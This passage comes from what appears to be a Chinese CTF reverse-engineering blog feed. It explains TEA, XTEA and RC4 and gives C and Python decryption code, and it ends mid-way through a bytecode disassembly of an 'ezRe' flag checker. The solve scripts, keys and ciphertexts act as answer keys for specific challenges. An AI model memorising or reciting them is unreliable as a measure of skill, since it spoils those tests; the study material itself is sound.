src="/./img/49277317_WycRVn6OYK9Yb94C/1745051399450-e208442e-27e9-427f-bb86-3ad4f52dabe3-583794.png" alt="1745051399450-e208442e-27e9-427f-bb86-3ad4f52dabe3.png"></p><p>每两个一组进行tea解密，一共6个三组解密完成</p><p><img src="/./img/49277317_WycRVn6OYK9Yb94C/1745052212499-e1eab54c-dd00-4422-9ff1-1829e6f25aa7-500255.png" alt="1745052212499-e1eab54c-dd00-4422-9ff1-1829e6f25aa7.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br> <br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v,<span class="hljs-type">uint32_t</span> *k)</span>&#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>],v1=v[<span class="hljs-number">1</span>],sum=<span class="hljs-number">0x1919810</span>*<span class="hljs-number">32</span>,i;  <br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">0x1919810</span>;<br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>],k1=k[<span class="hljs-number">1</span>],k2=k[<span class="hljs-number">2</span>],k3=k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br>        v1-=((v0&lt;&lt;<span class="hljs-number">4</span>)+k2)^(v0+sum)^((v0&gt;&gt;<span class="hljs-number">5</span>)+k3);<br>        v0-=((v1&lt;&lt;<span class="hljs-number">4</span>)+k0)^(v1+sum)^((v1&gt;&gt;<span class="hljs-number">5</span>)+k1);<br>        sum-=delta;<br>    &#125; <br>    v[<span class="hljs-number">0</span>]=v0;v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> input[] = &#123;<span class="hljs-number">0x12287745</span>, <span class="hljs-number">0x3692f306</span>, <span class="hljs-number">0x0ee7c0e2</span>, <span class="hljs-number">0xb97f85b7</span>, <span class="hljs-number">0xaa966689</span>, <span class="hljs-number">0x46b81a67</span>&#125;; <br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0x73656372</span>,<span class="hljs-number">0x65746b65</span>,<span class="hljs-number">0x79313233</span>,<span class="hljs-number">0x34353637</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">6</span>;i+=<span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>]=&#123;input[i],input[i+<span class="hljs-number">1</span>]&#125;;<br>        decrypt(v,k);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">2</span>; j++) &#123;                        <br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; k++) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[j] &amp; <span class="hljs-number">0xff</span>);<br>                v[j] &gt;&gt;= <span class="hljs-number">8</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="XTEA例题"><a href="#XTEA例题" class="headerlink" title="XTEA例题"></a>XTEA例题</h1><h2 id="1、-1"><a href="#1、-1" class="headerlink" title="1、"></a>1、</h2><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="/./img/49277317_WycRVn6OYK9Yb94C/1741071893775-0ce51887-c1a4-444a-acf3-1fc22abe7c73-191486.png" alt="1741071893775-0ce51887-c1a4-444a-acf3-1fc22abe7c73.png"></h2><p><font style="color:rgb(77, 77, 77);">这里是典型的XTEA加密和异或加密，但是根据给定的key和</font><font style="color:rgb(252, 85, 49);">算法</font><font style="color:rgb(77, 77, 77);">，计算出来的是一个假flag：</font><br><font style="color:rgb(77, 77, 77);">fakeflag_plz_Try_more_hard_to_find_the_true_flag</font></p><blockquote><p>更新: 2025-04-19 16:44:05<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/rqg1uagfufcb8ylp">https://www.yuque.com/chaye-apqbl/vsc85q/rqg1uagfufcb8ylp</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/RC4%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/RC4%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="RC4逆向"><a href="#RC4逆向" class="headerlink" title="RC4逆向"></a>RC4逆向</h1><p><a href="https://blog.csdn.net/Jsy050906/article/details/137167432?ops_request_misc=%257B%2522request%255Fid%2522%253A%252238E31D7F-6C34-4148-BF0E-3D27CE346A88%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=38E31D7F-6C34-4148-BF0E-3D27CE346A88&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-137167432-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=rc4%E7%AE%97%E6%B3%95&spm=1018.2226.3001.4187">详细了解RC4加密算法-CSDN博客</a></p><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p><font style="color:rgba(0, 0, 0, 0.87);">在</font><a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8">密码学</a><font style="color:rgba(0, 0, 0, 0.87);">中，</font><strong><font style="color:rgba(0, 0, 0, 0.87);">RC4</font></strong><font style="color:rgba(0, 0, 0, 0.87);">（来自 Rivest Cipher 4 的缩写）是一种</font><a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E5%8A%A0%E5%AF%86">流加密</a><font style="color:rgba(0, 0, 0, 0.87);">算法，</font><a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5">密钥</a><font style="color:rgba(0, 0, 0, 0.87);">长度可变。它加解密使用相同的密钥，因此也属于</font><a href="https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86">对称加密算法</a><font style="color:rgba(0, 0, 0, 0.87);">。RC4 是</font><a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86">有线等效加密</a><font style="color:rgba(0, 0, 0, 0.87);">（WEP）中采用的加密算法，也曾经是 </font><a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE">TLS</a><font style="color:rgba(0, 0, 0, 0.87);"> 可采用的算法之一。</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">rc4_init</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span> <span class="hljs-comment">//初始化函数</span><br>&#123;<br>    <span class="hljs-type">int</span> i =<span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> k[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;; <span class="hljs-comment">// 必须为无符号类型，否则会导致密文部分错误</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++) &#123;<br>        s[i] = i;<br>        k[i] = key[i%Len];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++) &#123;<br>        j=(j+s[i]+k[i])%<span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j]; <span class="hljs-comment">//交换s[i]和s[j]</span><br>        s[j] = tmp;<br>    &#125;<br> &#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">rc4_crypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *Data, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span> <span class="hljs-comment">//加解密</span><br>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp;<br>    <span class="hljs-keyword">for</span>(k=<span class="hljs-number">0</span>;k&lt;Len;k++) &#123;<br>        i=(i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span>;<br>        j=(j+s[i])%<span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j]; <span class="hljs-comment">//交换s[x]和s[y]</span><br>        s[j] = tmp;<br>        t=(s[i]+s[j])%<span class="hljs-number">256</span>;<br>        Data[k] ^= s[t];<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.87);">其伪代码表示为：</font></p><p><font style="color:rgba(0, 0, 0, 0.87);">初始化长度为 256 的 </font><a href="https://zh.wikipedia.org/wiki/S%E7%9B%92"><font style="color:rgba(0, 0, 0, 0.87);">S 盒</font></a><font style="color:rgba(0, 0, 0, 0.87);">。第一个 for 循环将 0 到 255 的互不重复的元素装入 S 盒。第二个 for 循环根据密钥打乱 S 盒。</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> i from <span class="hljs-number">0</span> to <span class="hljs-number">255</span><br>     S[i] := i<br> endfor<br> j := <span class="hljs-number">0</span><br> <span class="hljs-keyword">for</span>( i=<span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">256</span> ; i++)<br>     j := (j + S[i] + key[i mod keylength]) % <span class="hljs-number">256</span><br>     swap values of S[i] and S[j]<br> endfor<br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.87);">下面 i,j 是两个指针。每收到一个字节，就进行 while 循环。通过一定的算法（(a),(b)）定位 S 盒中的一个元素，并与输入字节异或，得到 k。循环中还改变了 S 盒（</font><font style="color:rgba(0, 0, 0, 0.87);">©</font><font style="color:rgba(0, 0, 0, 0.87);">）。如果输入的是</font><a href="https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87">明文</a><font style="color:rgba(0, 0, 0, 0.87);">，输出的就是</font><a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E6%96%87">密文</a><font style="color:rgba(0, 0, 0, 0.87);">；如果输入的是密文，输出的就是明文。</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">i := <span class="hljs-number">0</span><br> j := <span class="hljs-number">0</span><br> <span class="hljs-keyword">while</span> GeneratingOutput:<br>     i := (i + <span class="hljs-number">1</span>) mod <span class="hljs-number">256</span>   <span class="hljs-comment">//a</span><br>     j := (j + S[i]) mod <span class="hljs-number">256</span> <span class="hljs-comment">//b</span><br>     swap values of S[i] and S[j]  <span class="hljs-comment">//c</span><br>     k := inputByte ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>     output K<br> endwhile<br></code></pre></td></tr></table></figure><p><font style="color:rgba(0, 0, 0, 0.87);">此算法保证每 256 次循环中 S 盒的每个元素至少被交换过一次</font></p><h2 id="pyexp"><a href="#pyexp" class="headerlink" title="pyexp"></a>pyexp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs plain">def rc4_init(key):<br>    s = list(range(256))  # 初始化 s 为 0 到 255 的列表<br>    j = 0<br>    k = bytearray(256)  # 必须为无符号字节数组<br>    key_len = len(key)<br><br>    # 填充 k 并执行密钥调度算法（KSA）<br>    for i in range(256):<br>        k[i] = key[i % key_len]<br><br>    for i in range(256):<br>        j = (j + s[i] + k[i]) % 256<br>        s[i], s[j] = s[j], s[i]  # 交换 s[i] 和 s[j]<br><br>    return s  # 返回初始化后的状态数组 s<br><br><br>def rc4_crypt(s, data):<br>    i = 0<br>    j = 0<br>    result = bytearray(len(data))  # 用于存储加密/解密结果<br><br>    # 加解密过程<br>    for k in range(len(data)):<br>        i = (i + 1) % 256<br>        j = (j + s[i]) % 256<br>        s[i], s[j] = s[j], s[i]  # 交换 s[i] 和 s[j]<br>        t = (s[i] + s[j]) % 256<br>        result[k] = data[k] ^ s[t]  # 进行按位异或操作<br><br>    return result  # 返回加密/解密后的字节数组<br><br><br># 示例用法<br>key = b&quot;mysecretkey&quot;  # 秘钥<br>data = bytearray(b&quot;Hello, RC4!&quot;)  # 加密数据<br><br># 初始化 RC4 状态<br>s = rc4_init(key)<br><br># 加密或解密<br>encrypted_data = rc4_crypt(s.copy(), data)  # 需要传递 s 的副本<br>print(&quot;加密后：&quot;, encrypted_data)<br><br># 再次初始化 RC4 状态<br>s = rc4_init(key)<br><br># 使用相同的状态解密<br>decrypted_data = rc4_crypt(s.copy(), encrypted_data)<br>print(&quot;解密后：&quot;, decrypted_data.decode(&#x27;utf-8&#x27;))<br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><p><img src="/./img/49277317_PudqdKFXb4knYd2T/1715257489252-70021488-e008-4052-b81f-5e691514019c-011289.webp" alt="1715257489252-70021488-e008-4052-b81f-5e691514019c.png"></p><h2 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h2><p><img src="/./img/49277317_PudqdKFXb4knYd2T/1726985624038-95ebd59e-44f5-46cc-bddf-919007a294ac-669966.png" alt="1726985624038-95ebd59e-44f5-46cc-bddf-919007a294ac.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import ARC4<br>import binascii<br><br># 十六进制字符串<br>hex_data = &quot;A71A68ECD82711CC8C9B16155CD2673E82ADCE75D4BC5756C28A52B86BD6CCF8A4BA722FE05715B92411&quot;<br><br># 将十六进制字符串转换为字节<br>ciphertext = binascii.unhexlify(hex_data)<br><br># RC4 密钥（假设你知道密钥）<br>key = b&#x27;RC4_1s_4w3s0m3&#x27;  # 替换为你的RC4密钥<br><br># 创建 RC4 解密对象<br>cipher = ARC4.new(key)<br><br># 解密数据<br>plaintext = cipher.decrypt(ciphertext)<br><br># 输出解密后的内容<br>print(plaintext.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))<br></code></pre></td></tr></table></figure><h1 id="2024省赛初赛复现"><a href="#2024省赛初赛复现" class="headerlink" title="2024省赛初赛复现"></a><font style="color:rgb(35, 38, 59);">2024省赛初赛复现</font></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><code class="hljs plain">ezRe (Python 3.9)<br>[Code]<br>    File Name: flag_checker.py<br>    Object Name: &lt;module&gt;<br>    Arg Count: 0<br>    Pos Only Arg Count: 0<br>    KW Only Arg Count: 0<br>    Locals: 0<br>    Stack Size: 7<br>    Flags: 0x00000040 (CO_NOFREE)<br>    [Names]<br>        &#x27;base64&#x27;<br>        &#x27;input&#x27;<br>        &#x27;text&#x27;<br>        &#x27;key&#x27;<br>        &#x27;list&#x27;<br>        &#x27;range&#x27;<br>        &#x27;s&#x27;<br>        &#x27;j&#x27;<br>        &#x27;i&#x27;<br>        &#x27;len&#x27;<br>        &#x27;data&#x27;<br>        &#x27;_&#x27;<br>        &#x27;append&#x27;<br>        &#x27;result&#x27;<br>        &#x27;zip&#x27;<br>        &#x27;c&#x27;<br>        &#x27;k&#x27;<br>        &#x27;chr&#x27;<br>        &#x27;ord&#x27;<br>        &#x27;b64encode&#x27;<br>        &#x27;encode&#x27;<br>        &#x27;decode&#x27;<br>        &#x27;enc&#x27;<br>        &#x27;print&#x27;<br>    [Var Names]<br>    [Free Vars]<br>    [Cell Vars]<br>    [Constants]<br>        0<br>        None<br>        &#x27;Flag: &#x27;<br>        &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;<br>        [Code]<br>            File Name: flag_checker.py<br>            Object Name: &lt;listcomp&gt;<br>            Arg Count: 1<br>            Pos Only Arg Count: 0<br>            KW Only Arg Count: 0<br>            Locals: 2<br>            Stack Size: 4<br>            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)<br>            [Names]<br>                &#x27;ord&#x27;<br>            [Var Names]<br>                &#x27;.0&#x27;<br>                &#x27;i&#x27;<br>            [Free Vars]<br>            [Cell Vars]<br>            [Constants]<br>                102<br>            [Disassembly]<br>                0       BUILD_LIST                      0<br>                2       LOAD_FAST                       0: .0<br>                4       FOR_ITER                        16 (to 22)<br>                6       STORE_FAST                      1: i<br>                8       LOAD_GLOBAL                     0: ord<br>                10      LOAD_FAST                       1: i<br>                12      CALL_FUNCTION                   1<br>                14      LOAD_CONST                      0: 102<br>                16      BINARY_XOR                      <br>                18      LIST_APPEND                     2<br>                20      JUMP_ABSOLUTE                   4<br>                22      RETURN_VALUE                    <br>        &#x27;&lt;listcomp&gt;&#x27;<br>        256<br>        50<br>        1<br>        &#x27;&#x27;<br>        51<br>        &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;<br>        &#x27;yes!&#x27;<br>        &#x27;try again...&#x27;<br>    [Disassembly]<br>        0       LOAD_CONST                      0: 0<br>        2       LOAD_CONST                      1: None<br>        4       JUMP_FORWARD                    0 (to 6)<br>        6       JUMP_FORWARD                    0 (to 8)<br>        8       JUMP_FORWARD                    0 (to 10)<br>        10      IMPORT_NAME                     0: base64<br>        12      STORE_NAME                      0: base64<br>        14      LOAD_NAME                       1: input<br>        16      LOAD_CONST                      2: &#x27;Flag: &#x27;<br>        18      CALL_FUNCTION                   1<br>        20      STORE_NAME                      2: text<br>        22      LOAD_CONST                      3: &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;<br>        24      STORE_NAME                      3: key<br>        26      LOAD_CONST                      4: &lt;CODE&gt; &lt;listcomp&gt;<br>        28      LOAD_CONST                      5: &#x27;&lt;listcomp&gt;&#x27;<br>        30      MAKE_FUNCTION                   0<br>        32      LOAD_NAME                       3: key<br>        34      GET_ITER                        <br>        36      CALL_FUNCTION                   1<br>        38      STORE_NAME                      3: key<br>        40      LOAD_NAME                       4: list<br>        42      LOAD_NAME                       5: range<br>        44      LOAD_CONST                      6: 256<br>        46      CALL_FUNCTION                   1<br>        48      CALL_FUNCTION                   1<br>        50      STORE_NAME                      6: s<br>        52      LOAD_CONST                      0: 0<br>        54      STORE_NAME                      7: j<br>        56      LOAD_NAME                       5: range<br>        58      LOAD_CONST                      6: 256<br>        60      CALL_FUNCTION                   1<br>        62      GET_ITER                        <br>        64      FOR_ITER                        62 (to 128)<br>        66      STORE_NAME                      8: i<br>        68      LOAD_NAME                       7: j<br>        70      LOAD_NAME                       6: s<br>        72      LOAD_NAME                       8: i<br>        74      BINARY_SUBSCR                   <br>        76      BINARY_ADD                      <br>        78      LOAD_NAME                       3: key<br>        80      LOAD_NAME                       8: i<br>        82      LOAD_NAME                       9: len<br>        84      LOAD_NAME                       3: key<br>        86      CALL_FUNCTION                   1<br>        88      BINARY_MODULO                   <br>        90      BINARY_SUBSCR                   <br>        92      BINARY_ADD                      <br>        94      LOAD_CONST                      6: 256<br>        96      BINARY_MODULO                   <br>        98      STORE_NAME                      7: j<br>        100     LOAD_NAME                       6: s<br>        102     LOAD_NAME                       7: j<br>        104     BINARY_SUBSCR                   <br>        106     LOAD_NAME                       6: s<br>        108     LOAD_NAME                       8: i<br>        110     BINARY_SUBSCR                   <br>        112     ROT_TWO                         <br>        114     LOAD_NAME                       6: s<br>        116     